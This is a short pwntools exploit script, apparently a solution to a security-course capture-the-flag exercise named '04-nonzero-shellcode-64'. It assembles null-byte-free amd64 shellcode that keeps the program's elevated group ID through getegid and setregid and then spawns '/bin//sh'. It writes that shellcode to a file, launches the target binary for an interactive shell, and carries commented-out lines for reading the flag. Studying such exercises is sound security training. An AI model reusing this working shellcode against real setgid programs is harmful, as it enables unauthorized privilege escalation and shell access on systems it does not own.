from pwn import *
from pwn import asm, context, gdb, process
context .clear(arch="amd64")
context.terminal = ["tmux", 'splitw','-h']
context.log_level = "DEBUG"
shellcode = asm(
    f"""
xor eax, eax         /* RAX = 0 (31 C0), clears high 56 bits */
mov al, 108          /* RAX = 108 (getegid), 'B0 6C' has no 00 */
syscall                  /* getegid() -> returns egid in RAX */

mov rdi, rax         /* RDI = rgid = returned egid (48 89 C7) */
mov rsi, rax         /* RSI = egid = returned egid (48 89 C6) */

xor eax, eax         /* RAX = 0 (zero before 8-bit write) */
mov al, 114          /* RAX = 114 (setregid) */
syscall                  /* setregid(rdi, rsi) */

/* execve("/bin//sh", 0, 0) -- zero-free encoding */
xor     eax, eax             /* EAX=0 (31 C0) */
push    rax                  /* push 8 runtime zeros (50) */
mov     rbx, 0x68732f2f6e69622f  /* "/bin//sh" (no 00 bytes) */
push    rbx
mov     rdi, rsp             /* filename */
mov     rsi, rax             /* argv = 0 */
mov     rdx, rax             /* envp = 0 */
mov     al, 59               /* execve */
syscall
    """
)
outpath = os.path.abspath("shellcode.bin")
with open("shellcode.bin", "wb") as f:
    f.write(shellcode)
p = process(['./04-nonzero-shellcode-64'])
p.interactive()
# p.sendline(b"cat flag")
# flag = p.recvline_regex(b"[Cc][Ss]6332{.*}").decode()
# print("Flag:", flag)
